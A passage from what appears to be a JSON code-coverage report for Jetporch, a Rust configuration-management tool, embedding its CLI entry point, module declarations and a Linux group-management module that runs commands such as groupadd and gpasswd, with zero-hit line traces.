grp.update_variables(vars);\n        }\n    }\n\n    Ok(())\n}\n\npub fn convert_json_vars(input: \u0026serde_json::Value) -\u003e serde_yaml::Mapping {\n    let json = input.to_string();\n    let parse_result: Result\u003cserde_yaml::Mapping, serde_yaml::Error\u003e = serde_yaml::from_str(\u0026json);\n    match parse_result {\n       Ok(parsed) =\u003e return parsed.clone(),\n       Err(y) =\u003e panic!(\"unable to load JSON back to YAML (1), this shouldn't happen: {}\", y)\n    } \n}\n","traces":[{"line":64,"address":[],"length":0,"stats":{"Line":0}},{"line":67,"address":[],"length":0,"stats":{"Line":0}},{"line":68,"address":[],"length":0,"stats":{"Line":0}},{"line":71,"address":[],"length":0,"stats":{"Line":0}},{"line":72,"address":[],"length":0,"stats":{"Line":0}},{"line":73,"address":[],"length":0,"stats":{"Line":0}},{"line":74,"address":[],"length":0,"stats":{"Line":0}},{"line":75,"address":[],"length":0,"stats":{"Line":0}},{"line":77,"address":[],"length":0,"stats":{"Line":0}},{"line":78,"address":[],"length":0,"stats":{"Line":0}},{"line":80,"address":[],"length":0,"stats":{"Line":0}},{"line":83,"address":[],"length":0,"stats":{"Line":0}},{"line":84,"address":[],"length":0,"stats":{"Line":0}},{"line":85,"address":[],"length":0,"stats":{"Line":0}},{"line":86,"address":[],"length":0,"stats":{"Line":0}},{"line":87,"address":[],"length":0,"stats":{"Line":0}},{"line":89,"address":[],"length":0,"stats":{"Line":0}},{"line":93,"address":[],"length":0,"stats":{"Line":0}},{"line":101,"address":[],"length":0,"stats":{"Line":0}},{"line":102,"address":[],"length":0,"stats":{"Line":0}},{"line":103,"address":[],"length":0,"stats":{"Line":0}},{"line":104,"address":[],"length":0,"stats":{"Line":0}},{"line":105,"address":[],"length":0,"stats":{"Line":0}},{"line":106,"address":[],"length":0,"stats":{"Line":0}},{"line":107,"address":[],"length":0,"stats":{"Line":0}},{"line":109,"address":[],"length":0,"stats":{"Line":0}},{"line":110,"address":[],"length":0,"stats":{"Line":0}},{"line":112,"address":[],"length":0,"stats":{"Line":0}},{"line":113,"address":[],"length":0,"stats":{"Line":0}},{"line":115,"address":[],"length":0,"stats":{"Line":0}},{"line":116,"address":[],"length":0,"stats":{"Line":0}},{"line":118,"address":[],"length":0,"stats":{"Line":0}},{"line":122,"address":[],"length":0,"stats":{"Line":0}},{"line":123,"address":[],"length":0,"stats":{"Line":0}},{"line":125,"address":[],"length":0,"stats":{"Line":0}},{"line":128,"address":[],"length":0,"stats":{"Line":0}},{"line":129,"address":[],"length":0,"stats":{"Line":0}},{"line":133,"address":[],"length":0,"stats":{"Line":0}},{"line":134,"address":[],"length":0,"stats":{"Line":0}},{"line":137,"address":[],"length":0,"stats":{"Line":0}},{"line":138,"address":[],"length":0,"stats":{"Line":0}},{"line":139,"address":[],"length":0,"stats":{"Line":0}},{"line":140,"address":[],"length":0,"stats":{"Line":0}},{"line":141,"address":[],"length":0,"stats":{"Line":0}},{"line":143,"address":[],"length":0,"stats":{"Line":0}},{"line":144,"address":[],"length":0,"stats":{"Line":0}},{"line":145,"address":[],"length":0,"stats":{"Line":0}},{"line":147,"address":[],"length":0,"stats":{"Line":0}},{"line":152,"address":[],"length":0,"stats":{"Line":0}},{"line":153,"address":[],"length":0,"stats":{"Line":0}},{"line":154,"address":[],"length":0,"stats":{"Line":0}},{"line":155,"address":[],"length":0,"stats":{"Line":0}},{"line":156,"address":[],"length":0,"stats":{"Line":0}},{"line":157,"address":[],"length":0,"stats":{"Line":0}},{"line":159,"address":[],"length":0,"stats":{"Line":0}},{"line":160,"address":[],"length":0,"stats":{"Line":0}},{"line":161,"address":[],"length":0,"stats":{"Line":0}},{"line":162,"address":[],"length":0,"stats":{"Line":0}},{"line":164,"address":[],"length":0,"stats":{"Line":0}},{"line":165,"address":[],"length":0,"stats":{"Line":0}},{"line":173,"address":[],"length":0,"stats":{"Line":0}},{"line":175,"address":[],"length":0,"stats":{"Line":0}},{"line":177,"address":[],"length":0,"stats":{"Line":0}},{"line":179,"address":[],"length":0,"stats":{"Line":0}},{"line":181,"address":[],"length":0,"stats":{"Line":0}},{"line":182,"address":[],"length":0,"stats":{"Line":0}},{"line":185,"address":[],"length":0,"stats":{"Line":0}},{"line":186,"address":[],"length":0,"stats":{"Line":0}},{"line":190,"address":[],"length":0,"stats":{"Line":0}},{"line":192,"address":[],"length":0,"stats":{"Line":0}},{"line":194,"address":[],"length":0,"stats":{"Line":0}},{"line":198,"address":[],"length":0,"stats":{"Line":0}},{"line":199,"address":[],"length":0,"stats":{"Line":0}},{"line":200,"address":[],"length":0,"stats":{"Line":0}},{"line":201,"address":[],"length":0,"stats":{"Line":0}},{"line":202,"address":[],"length":0,"stats":{"Line":0}},{"line":204,"address":[],"length":0,"stats":{"Line":0}},{"line":209,"address":[],"length":0,"stats":{"Line":0}},{"line":210,"address":[],"length":0,"stats":{"Line":0}},{"line":211,"address":[],"length":0,"stats":{"Line":0}},{"line":212,"address":[],"length":0,"stats":{"Line":0}},{"line":214,"address":[],"length":0,"stats":{"Line":0}},{"line":215,"address":[],"length":0,"stats":{"Line":0}},{"line":216,"address":[],"length":0,"stats":{"Line":0}},{"line":219,"address":[],"length":0,"stats":{"Line":0}},{"line":221,"address":[],"length":0,"stats":{"Line":0}},{"line":225,"address":[],"length":0,"stats":{"Line":0}},{"line":227,"address":[],"length":0,"stats":{"Line":0}},{"line":229,"address":[],"length":0,"stats":{"Line":0}},{"line":230,"address":[],"length":0,"stats":{"Line":0}},{"line":231,"address":[],"length":0,"stats":{"Line":0}},{"line":232,"address":[],"length":0,"stats":{"Line":0}},{"line":233,"address":[],"length":0,"stats":{"Line":0}},{"line":234,"address":[],"length":0,"stats":{"Line":0}},{"line":237,"address":[],"length":0,"stats":{"Line":0}},{"line":240,"address":[],"length":0,"stats":{"Line":0}},{"line":241,"address":[],"length":0,"stats":{"Line":0}},{"line":242,"address":[],"length":0,"stats":{"Line":0}},{"line":244,"address":[],"length":0,"stats":{"Line":0}},{"line":246,"address":[],"length":0,"stats":{"Line":0}},{"line":247,"address":[],"length":0,"stats":{"Line":0}},{"line":248,"address":[],"length":0,"stats":{"Line":0}},{"line":249,"address":[],"length":0,"stats":{"Line":0}},{"line":251,"address":[],"length":0,"stats":{"Line":0}},{"line":252,"address":[],"length":0,"stats":{"Line":0}},{"line":255,"address":[],"length":0,"stats":{"Line":0}},{"line":256,"address":[],"length":0,"stats":{"Line":0}},{"line":258,"address":[],"length":0,"stats":{"Line":0}},{"line":259,"address":[],"length":0,"stats":{"Line":0}},{"line":260,"address":[],"length":0,"stats":{"Line":0}},{"line":261,"address":[],"length":0,"stats":{"Line":0}},{"line":262,"address":[],"length":0,"stats":{"Line":0}},{"line":263,"address":[],"length":0,"stats":{"Line":0}},{"line":264,"address":[],"length":0,"stats":{"Line":0}},{"line":265,"address":[],"length":0,"stats":{"Line":0}},{"line":268,"address":[],"length":0,"stats":{"Line":0}},{"line":269,"address":[],"length":0,"stats":{"Line":0}},{"line":270,"address":[],"length":0,"stats":{"Line":0}},{"line":271,"address":[],"length":0,"stats":{"Line":0}},{"line":275,"address":[],"length":0,"stats":{"Line":0}},{"line":276,"address":[],"length":0,"stats":{"Line":0}},{"line":277,"address":[],"length":0,"stats":{"Line":0}},{"line":278,"address":[],"length":0,"stats":{"Line":0}},{"line":281,"address":[],"length":0,"stats":{"Line":0}},{"line":282,"address":[],"length":0,"stats":{"Line":0}},{"line":283,"address":[],"length":0,"stats":{"Line":0}},{"line":284,"address":[],"length":0,"stats":{"Line":0}},{"line":288,"address":[],"length":0,"stats":{"Line":0}},{"line":291,"address":[],"length":0,"stats":{"Line":0}},{"line":292,"address":[],"length":0,"stats":{"Line":0}},{"line":293,"address":[],"length":0,"stats":{"Line":0}},{"line":294,"address":[],"length":0,"stats":{"Line":0}},{"line":295,"address":[],"length":0,"stats":{"Line":0}},{"line":296,"address":[],"length":0,"stats":{"Line":0}}],"covered":0,"coverable":134},{"path":["/","Users","wings","projects","jetpack","src","inventory","mod.rs"],"content":"// Jetporch\n// Copyright (C) 2023 - Michael DeHaan \u003cmichael@michaeldehaan.net\u003e + contributors\n//\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// at your option) any later version.\n// \n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n// \n// You should have received a copy of the GNU General Public License\n// long with this program.  If not, see \u003chttp://www.gnu.org/licenses/\u003e.\n\npub mod groups;\npub mod hosts;\npub mod loading;\npub mod inventory;\n","traces":[],"covered":0,"coverable":0},{"path":["/","Users","wings","projects","jetpack","src","lib.rs"],"content":"// Jetporch\n// Copyright (C) 2023 - Michael DeHaan \u003cmichael@michaeldehaan.net\u003e + contributors\n//\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// at your option) any later version.\n// \n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n// \n// You should have received a copy of the GNU General Public License\n// long with this program.  If not, see \u003chttp://www.gnu.org/licenses/\u003e.\n\npub mod cli;\npub mod connection;\npub mod handle;\npub mod inventory;\npub mod modules;\npub mod playbooks;\npub mod registry;\npub mod tasks;\npub mod util;\n\n// Re-export commonly used types\npub use inventory::inventory::Inventory;","traces":[],"covered":0,"coverable":0},{"path":["/","Users","wings","projects","jetpack","src","main.rs"],"content":"// Jetporch\n// Copyright (C) 2023 - Michael DeHaan \u003cmichael@michaeldehaan.net\u003e + contributors\n//\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// at your option) any later version.\n// \n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n// \n// You should have received a copy of the GNU General Public License\n// long with this program.  If not, see \u003chttp://www.gnu.org/licenses/\u003e.\n\nmod cli;\nmod inventory;\nmod util;\nmod playbooks;\nmod registry;\nmod connection;\nmod modules;\nmod tasks;\nmod handle;\n\nuse crate::util::io::{quit};\nuse crate::inventory::inventory::Inventory;\nuse crate::inventory::loading::{load_inventory};\nuse crate::cli::show::{show_inventory_group,show_inventory_host};\nuse crate::cli::parser::{CliParser};\nuse crate::cli::playbooks::{playbook_ssh,playbook_local,playbook_check_ssh,playbook_check_local,playbook_simulate}; // FIXME: check modes coming\nuse std::sync::{Arc,RwLock};\nuse std::process;\n\nfn main() {\n    match liftoff() { Err(e) =\u003e quit(\u0026e), _ =\u003e {} }\n}\n\nfn liftoff() -\u003e Result\u003c(),String\u003e {\n\n    let mut cli_parser = CliParser::new();\n    cli_parser.parse()?;\n\n    // jetp --help was given, or no arguments\n    if cli_parser.needs_help {\n        cli_parser.show_help();\n        return Ok(());\n    }\n    if cli_parser.needs_version {\n        cli_parser.show_version();\n        return Ok(());\n    }\n\n    let inventory : Arc\u003cRwLock\u003cInventory\u003e\u003e = Arc::new(RwLock::new(Inventory::new()));\n\n    match cli_parser.mode {\n        cli::parser::CLI_MODE_SSH | cli::parser::CLI_MODE_CHECK_SSH | cli::parser::CLI_MODE_SHOW | cli::parser::CLI_MODE_SIMULATE =\u003e {\n            load_inventory(\u0026inventory, Arc::clone(\u0026cli_parser.inventory_paths))?;\n            if ! cli_parser.inventory_set {\n                return Err(String::from(\"--inventory is required\"));\n            }\n            if inventory.read().expect(\"inventory read\").hosts.len() == 0 {\n                return Err(String::from(\"no hosts found in --inventory\"));\n            }\n        },\n        _ =\u003e {\n            inventory.write().expect(\"inventory write\").store_host(\u0026String::from(\"all\"), \u0026String::from(\"localhost\"));\n        }\n    };\n\n    match cli_parser.mode {\n        cli::parser::CLI_MODE_SHOW =\u003e {},\n        _ =\u003e {\n            if ! cli_parser.playbook_set {\n                return Err(String::from(\"--playbook is required\"));\n            }\n        }\n    };\n\n    if cli_parser.threads \u003e 1 {\n        rayon::ThreadPoolBuilder::new().num_threads(cli_parser.threads).build_global().expect(\"build global\");\n    };\n\n    let exit_status = match cli_parser.mode {\n        cli::parser::CLI_MODE_SHOW   =\u003e match handle_show(\u0026inventory, \u0026cli_parser) {\n            Ok(_) =\u003e 0,\n            Err(s) =\u003e {\n                println!(\"{}\", s);\n                1\n            }\n        }\n        cli::parser::CLI_MODE_SSH         =\u003e playbook_ssh(\u0026inventory, \u0026cli_parser),\n        cli::parser::CLI_MODE_CHECK_SSH   =\u003e playbook_check_ssh(\u0026inventory, \u0026cli_parser),\n        cli::parser::CLI_MODE_LOCAL       =\u003e playbook_local(\u0026inventory, \u0026cli_parser),\n        cli::parser::CLI_MODE_CHECK_LOCAL =\u003e playbook_check_local(\u0026inventory, \u0026cli_parser),\n        cli::parser::CLI_MODE_SIMULATE    =\u003e playbook_simulate(\u0026inventory, \u0026cli_parser),\n\n        _ =\u003e { println!(\"invalid CLI mode\"); 1 }\n    };\n    if exit_status != 0 {\n        process::exit(exit_status);\n    }\n    return Ok(());\n}\n\npub fn handle_show(inventory: \u0026Arc\u003cRwLock\u003cInventory\u003e\u003e, parser: \u0026CliParser) -\u003e Result\u003c(), String\u003e {\n    // jetp show -i inventory\n    // jetp show -i inventory --groups g1:g2\n    // jetp show -i inventory --hosts h1:h2\n    if parser.show_groups.is_empty() \u0026\u0026 parser.show_hosts.is_empty() {\n        show_inventory_group(inventory, \u0026String::from(\"all\"))?;\n    }\n    for group_name in parser.show_groups.iter() {\n        show_inventory_group(inventory, \u0026group_name.clone())?;\n    }\n    for host_name in parser.show_hosts.iter() {\n        show_inventory_host(inventory, \u0026host_name.clone())?;\n    }\n    return Ok(());\n}\n\n","traces":[{"line":36,"address":[],"length":0,"stats":{"Line":0}},{"line":37,"address":[],"length":0,"stats":{"Line":0}},{"line":40,"address":[],"length":0,"stats":{"Line":0}},{"line":42,"address":[],"length":0,"stats":{"Line":0}},{"line":43,"address":[],"length":0,"stats":{"Line":0}},{"line":46,"address":[],"length":0,"stats":{"Line":0}},{"line":47,"address":[],"length":0,"stats":{"Line":0}},{"line":48,"address":[],"length":0,"stats":{"Line":0}},{"line":50,"address":[],"length":0,"stats":{"Line":0}},{"line":51,"address":[],"length":0,"stats":{"Line":0}},{"line":52,"address":[],"length":0,"stats":{"Line":0}},{"line":55,"address":[],"length":0,"stats":{"Line":0}},{"line":57,"address":[],"length":0,"stats":{"Line":0}},{"line":59,"address":[],"length":0,"stats":{"Line":0}},{"line":60,"address":[],"length":0,"stats":{"Line":0}},{"line":61,"address":[],"length":0,"stats":{"Line":0}},{"line":63,"address":[],"length":0,"stats":{"Line":0}},{"line":64,"address":[],"length":0,"stats":{"Line":0}},{"line":67,"address":[],"length":0,"stats":{"Line":0}},{"line":68,"address":[],"length":0,"stats":{"Line":0}},{"line":72,"address":[],"length":0,"stats":{"Line":0}},{"line":73,"address":[],"length":0,"stats":{"Line":0}},{"line":75,"address":[],"length":0,"stats":{"Line":0}},{"line":76,"address":[],"length":0,"stats":{"Line":0}},{"line":81,"address":[],"length":0,"stats":{"Line":0}},{"line":82,"address":[],"length":0,"stats":{"Line":0}},{"line":85,"address":[],"length":0,"stats":{"Line":0}},{"line":86,"address":[],"length":0,"stats":{"Line":0}},{"line":87,"address":[],"length":0,"stats":{"Line":0}},{"line":88,"address":[],"length":0,"stats":{"Line":0}},{"line":89,"address":[],"length":0,"stats":{"Line":0}},{"line":90,"address":[],"length":0,"stats":{"Line":0}},{"line":93,"address":[],"length":0,"stats":{"Line":0}},{"line":94,"address":[],"length":0,"stats":{"Line":0}},{"line":95,"address":[],"length":0,"stats":{"Line":0}},{"line":96,"address":[],"length":0,"stats":{"Line":0}},{"line":97,"address":[],"length":0,"stats":{"Line":0}},{"line":99,"address":[],"length":0,"stats":{"Line":0}},{"line":101,"address":[],"length":0,"stats":{"Line":0}},{"line":102,"address":[],"length":0,"stats":{"Line":0}},{"line":104,"address":[],"length":0,"stats":{"Line":0}},{"line":107,"address":[],"length":0,"stats":{"Line":0}},{"line":111,"address":[],"length":0,"stats":{"Line":0}},{"line":112,"address":[],"length":0,"stats":{"Line":0}},{"line":114,"address":[],"length":0,"stats":{"Line":0}},{"line":115,"address":[],"length":0,"stats":{"Line":0}},{"line":117,"address":[],"length":0,"stats":{"Line":0}},{"line":118,"address":[],"length":0,"stats":{"Line":0}},{"line":120,"address":[],"length":0,"stats":{"Line":0}}],"covered":0,"coverable":49},{"path":["/","Users","wings","projects","jetpack","src","modules","access","group.rs"],"content":"// Jetporch\n// Copyright (C) 2023 - JetPorch Project Contributors\n//\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// at your option) any later version.\n//\n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n//\n// You should have received a copy of the GNU General Public License\n// long with this program.  If not, see \u003chttp://www.gnu.org/licenses/\u003e.\n\nuse crate::inventory::hosts::HostOSType;\nuse crate::tasks::*;\nuse crate::handle::handle::TaskHandle;\nuse crate::tasks::fields::Field;\nuse serde::{Deserialize};\nuse std::collections::{HashSet};\nuse std::sync::Arc;\nuse std::vec::Vec;\n\nconst MODULE: \u0026str = \"group\";\n\n#[derive(Deserialize,Debug)]\n#[serde(deny_unknown_fields)]\npub struct GroupTask {\n    pub name:           Option\u003cString\u003e,\n    pub group:          String,\n    pub gid:            Option\u003cString\u003e,\n    pub users:          Option\u003cHashSet\u003cString\u003e\u003e,\n    pub append:         Option\u003cString\u003e,\n    pub system:         Option\u003cString\u003e,\n    pub remove:         Option\u003cString\u003e,\n    pub with:           Option\u003cPreLogicInput\u003e,\n    pub and:            Option\u003cPostLogicInput\u003e\n}\n\nstruct GroupAction {\n    pub group:          String,\n    pub gid:            Option\u003cu64\u003e,\n    pub users:          Option\u003cHashSet\u003cString\u003e\u003e,\n    pub append:         bool,\n    pub system:         bool,\n    pub remove:         bool,\n}\n\nstruct GroupDetails {\n    exists:     bool,\n    gid:        Option\u003cu64\u003e,\n    users:      Option\u003cHashSet\u003cString\u003e\u003e,\n}\n\nimpl IsTask for GroupTask {\n\n    fn get_module(\u0026self) -\u003e String { String::from(MODULE) }\n    fn get_name(\u0026self) -\u003e Option\u003cString\u003e { self.name.clone() }\n    fn get_with(\u0026self) -\u003e Option\u003cPreLogicInput\u003e { self.with.clone() }\n\n    fn evaluate(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e, tm: TemplateMode) -\u003e Result\u003cEvaluatedTask, Arc\u003cTaskResponse\u003e\u003e {\n        return Ok(\n            EvaluatedTask {\n                action: Arc::new(GroupAction {\n                    group:          handle.template.string_no_spaces(request, tm, \u0026String::from(\"group\"), \u0026self.group)?,\n                    gid:            handle.template.integer_option(request, tm, \u0026String::from(\"gid\"), \u0026self.gid, None)?,\n                    users:          {\n                        match \u0026self.users {\n                            Some(users) =\u003e {\n                                let mut templated_users: HashSet\u003cString\u003e = HashSet::new();\n                                for user in users {\n                                    templated_users.insert(handle.template.string_no_spaces(request, tm, \u0026String::from(\"users\"), user)?);\n                                }\n                                Some(templated_users)\n                            },\n                            None =\u003e {None}\n                        }\n                    },\n                    append:         handle.template.boolean_option_default_false(\u0026request, tm, \u0026String::from(\"append\"), \u0026self.append)?,\n                    system:         handle.template.boolean_option_default_false(\u0026request, tm, \u0026String::from(\"system\"), \u0026self.system)?,\n                    remove:         handle.template.boolean_option_default_false(\u0026request, tm, \u0026String::from(\"remove\"), \u0026self.remove)?,\n                }),\n                with: Arc::new(PreLogicInput::template(\u0026handle, \u0026request, tm, \u0026self.with)?),\n                and: Arc::new(PostLogicInput::template(\u0026handle, \u0026request, tm, \u0026self.and)?),\n            }\n        );\n    }\n\n}\n\nimpl IsAction for GroupAction {\n\n    fn dispatch(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Result\u003cArc\u003cTaskResponse\u003e, Arc\u003cTaskResponse\u003e\u003e {\n\n        match request.request_type {\n\n            TaskRequestType::Query =\u003e {\n                let os_type = handle.host.read().unwrap().os_type.unwrap();\n                if os_type != HostOSType::Linux {\n                    return Err(handle.response.is_failed(request, \u0026String::from(\"this group module only supports Linux\")));\n                }\n                let actual: GroupDetails = self.get_group_details(handle, request)?;\n                match (actual.exists, self.remove) {\n                    (false, true)  =\u003e return Ok(handle.response.is_matched(request)),\n                    (false, false) =\u003e return Ok(handle.response.needs_creation(request)),\n                    (true, true)   =\u003e return Ok(handle.response.needs_removal(request)),\n                    (true, false)  =\u003e {\n\n                        let mut changes : Vec\u003cField\u003e = Vec::new();\n                        if GroupAction::u64_wants_change(\u0026self.gid, \u0026actual.gid) { changes.push(Field::Gid); }\n                        if self.users_wants_change(\u0026actual) { changes.push(Field::Users); }\n\n                        match changes.len() {\n                            0 =\u003e return Ok(handle.response.is_matched(request)),\n                            _ =\u003e return Ok(handle.response.needs_modification(request, \u0026changes)),\n                        }\n                    }\n                }\n            },\n\n            TaskRequestType::Create =\u003e {\n                let cmd = self.create_group_command();\n                handle.remote.run(request, \u0026cmd, CheckRc::Checked)?;\n                if self.create_group_users_command().is_some() {\n                    let cmd = self.create_group_users_command().unwrap();\n                    handle.remote.run(request, \u0026cmd, CheckRc::Checked)?;\n                }\n                return Ok(handle.response.is_created(request));\n            },\n\n            TaskRequestType::Modify =\u003e {\n                let actual: GroupDetails = self.get_group_details(handle, request)?;\n                if self.modify_group_command(\u0026actual, \u0026request.changes).is_some() {\n                    let cmd = self.modify_group_command(\u0026actual, \u0026request.changes).unwrap();\n                    handle.remote.run(request, \u0026cmd, CheckRc::Checked)?;\n                }\n                if self.modify_group_users_command(\u0026actual, \u0026request.changes).is_some() {\n                    let cmd = self.modify_group_users_command(\u0026actual, \u0026request.changes).unwrap();\n                    handle.remote.run(request, \u0026cmd, CheckRc::Checked)?;\n                }\n                return Ok(handle.response.is_modified(request, request.changes.clone()));\n            },\n\n            TaskRequestType::Remove =\u003e {\n                let cmd = self.delete_group_command();\n                handle.remote.run(request, \u0026cmd, CheckRc::Checked)?;\n                return Ok(handle.response.is_removed(request))\n            }\n\n            // no passive or execute leg\n            _ =\u003e { return Err(handle.response.not_supported(request)); }\n\n        }\n    }\n}\n\nimpl GroupAction {\n\n    fn get_group_details (\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Result\u003cGroupDetails,Arc\u003cTaskResponse\u003e\u003e {\n        let cmd = self.get_group_command();\n        let result = handle.remote.run(request, \u0026cmd, CheckRc::Unchecked)?;\n        let (rc, out) = cmd_info(\u0026result);\n\n        match rc {\n            // return early if group does not exist (rc = 2)\n            2 =\u003e {\n                return Ok(GroupDetails {\n                    exists:   false,\n                    gid:      None,\n                    users:    None,\n                })\n            }\n            0 =\u003e {\n                let items: Vec\u003c\u0026str\u003e = out.split(\":\").collect();\n                let users: HashSet\u003cString\u003e;\n                // getent group from pkg shadow on alpine leaves the third colon off\n                // if no users are asigned to the group. F.e:\n                // A group with users assigned on any linux including alpine\n                //     users:x:100:alice,bob\n                // A group with no users assigned on any linux\n                //     users:x:100:\n                // versus alpine\n                //     users:x:100\n                // Thus the length of  a Vec after split is always 4 on any linux exept alpine\n                // where it is 3 if no users assigned. So we need to handle that here:\n                if items.len() == 4 {\n                    let str_vec: Vec\u003c\u0026str\u003e = items[3].split(\",\").collect();\n                    users = str_vec.iter().map(|\u0026s| s.to_string()).collect();\n                } else {\n                    users = HashSet::new();\n                }\n                return Ok(GroupDetails {\n                    exists: true,\n                    gid:    Some(items[2].parse().unwrap()),\n                    users: Some(users),\n                })\n            }\n            x =\u003e { return Err(handle.response.is_failed(request, \u0026format!(\"failure getting group details, rc: '{}'\", x))); }\n        }\n    }\n\n    fn get_group_command(\u0026self) -\u003e String {\n        // returns a string devided by 3 colons (':')\n        // group:pwd:GID:users\n        // F.e.: users:x:100:alice,bob\n        // Of course: the pwd field does just contain an 'x' in modern Unix/Linux because of /etc/shadow\n        return format!(\"getent group '{}'\", self.group);\n    }\n\n    fn create_group_command(\u0026self) -\u003e String {\n        let mut cmd = String::from(\"groupadd\");\n        if self.gid.is_some() {\n            cmd.push_str(\u0026format!(\" -g '{}'\", self.gid.as_ref().unwrap()));\n        }\n        if self.system \u0026\u0026 self.gid.is_none() {\n             cmd.push_str(\u0026format!(\" -r\"));\n        }\n        cmd.push_str(\u0026format!(\" '{}'\", self.group));\n        return cmd;\n    }\n\n    fn create_group_users_command(\u0026self) -\u003e Option\u003cString\u003e {\n        if self.users.is_some() {\n            let final_users: Vec\u003cString\u003e = self.users.as_ref().unwrap().iter().cloned().collect();\n            return Some(format!(\"gpasswd -M '{}' '{}'\", final_users.join(\",\"), self.group));\n        } else {\n            return None;\n        }\n    }\n\n    fn modify_group_command(\u0026self, _actual: \u0026GroupDetails, changes: \u0026Vec\u003cField\u003e) -\u003e Option\u003cString\u003e {\n        if changes.contains(\u0026Field::Gid) {\n            let mut cmd = String::from(\"groupmod\");\n            if self.gid.is_some() \u0026\u0026 changes.contains(\u0026Field::Gid) {\n                cmd.push_str(\u0026format!(\" -g '{}'\", self.gid.as_ref().unwrap()));\n            }\n            cmd.push_str(\u0026format!(\" '{}'\", self.group));\n            return Some(cmd);\n        }\n        return None;\n    }\n\n    fn modify_group_users_command(\u0026self, actual: \u0026GroupDetails, changes: \u0026Vec\u003cField\u003e) -\u003e Option\u003cString\u003e {\n        if self.users.is_some() \u0026\u0026 changes.contains(\u0026Field::Users) {\n            match self.append {\n                true =\u003e {\n                    match \u0026actual.users {\n                        // if some users already exist, we need to add the new ones\n                        Some(actual_users) =\u003e {\n                            let mut users = self.users.clone().unwrap();\n                            for user in actual_users {\n                                 users.insert(user.clone());\n                            }\n                            let final_users: Vec\u003cString\u003e = users.iter().cloned().collect();\n                            return Some(format!(\"gpasswd -M '{}' '{}'\",final_users.join(\",\"), self.group))\n                        },\n                        // otherwise we just take the new ones\n                        None =\u003e {\n                            let final_users: Vec\u003cString\u003e = self.users.as_ref().unwrap().iter().cloned().collect();\n                            return Some(format!(\"gpasswd -M '{}' '{}'\",final_users.join(\",\"), self.group))\n                        }\n                    }\n                },\n                // just replace existing users with new users\n                false =\u003e {\n                    let final_users: Vec\u003cString\u003e = self.users.as_ref().unwrap().iter().cloned().collect();\n                    return Some(format!(\"gpasswd -M '{}' '{}'\", final_users.join(\",\"), self.group))\n                }\n            }\n        }\n        return None;\n    }\n\n    fn delete_group_command(\u0026self) -\u003e String {\n        return format!(\"groupdel '{}'\", self.group)\n    }\n\n    fn u64_wants_change(our: \u0026Option\u003cu64\u003e, actual: \u0026Option\u003cu64\u003e) -\u003e bool {\n        if our.is_some() {\n            if actual.is_none() {\n                return true\n            }\n            if ! our.as_ref().unwrap().eq(actual.as_ref().unwrap()) {\n                return true;\n            }\n        }\n        return false;\n    }\n\n    fn users_wants_change(\u0026self, actual: \u0026GroupDetails) -\u003e bool {\n        if self.users.is_none() {\n            // no preference about configuration on the remote system\n            return false\n        }\n        if actual.users.is_none() {\n            // no remote users yet\n            return true;\n        }\n        let actual_users  = actual.users.as_ref().unwrap();\n        let desired_users = self.users.clone().unwrap();\n        if self.append {\n            return ! desired_users.is_subset(\u0026actual_users);\n        } else {\n            return desired_users != *actual_users\n        }\n    }\n\n}\n","traces":[{"line":59,"address":[],"length":0,"stats":{"Line":0}},{"line":60,"address":[],"length":0,"stats":{"Line":0}},{"line":61,"address":[],"length":0,"stats":{"Line":0}},{"line":63,"address":[],"length":0,"stats":{"Line":0}},{"line":64,"address":[],"length":0,"stats":{"Line":0}},{"line":65,"address":[],"length":0,"stats":{"Line":0}},{"line":66,"address":[],"length":0,"stats":{"Line":0}},{"line":67,"address":[],"length":0,"stats":{"Line":0}},{"line":68,"address":[],"length":0,"stats":{"Line":0}},{"line":70,"address":[],"length":0,"stats":{"Line":0}},{"line":71,"address":[],"length":0,"stats":{"Line":0}},{"line":72,"address":[],"length":0,"stats":{"Line":0}},{"line":73,"address":[],"length":0,"stats":{"Line":0}},{"line":74,"address":[],"length":0,"stats":{"Line":0}},{"line":76,"address":[],"length":0,"stats":{"Line":0}},{"line":78,"address":[],"length":0,"stats":{"Line":0}},{"line":81,"address":[],"length":0,"stats":{"Line":0}},{"line":82,"address":[],"length":0,"stats":{"Line":0}},{"line":83,"address":[],"length":0,"stats":{"Line":0}},{"line":85,"address":[],"length":0,"stats":{"Line":0}},{"line":86,"address":[],"length":0,"stats":{"Line":0}},{"line":95,"address":[],"length":0,"stats":{"Line":0}},{"line":97,"address":[],"length":0,"stats":{"Line":0}},{"line":100,"address":[],"length":0,"stats":{"Line":0}},{"line":101,"address":[],"length":0,"stats":{"Line":0}},{"line":102,"address":[],"length":0,"stats":{"Line":0}},{"line":104,"address":[],"length":0,"stats":{"Line":0}},{"line":105,"address":[],"length":0,"stats":{"Line":0}},{"line":106,"address":[],"length":0,"stats":{"Line":0}},{"line":107,"address":[],"length":0,"stats":{"Line":0}},{"line":108,"address":[],"length":0,"stats":{"Line":0}},{"line":111,"address":[],"length":0,"stats":{"Line":0}},{"line":112,"address":[],"length":0,"stats":{"Line":0}},{"line":113,"address":[],"length":0,"stats":{"Line"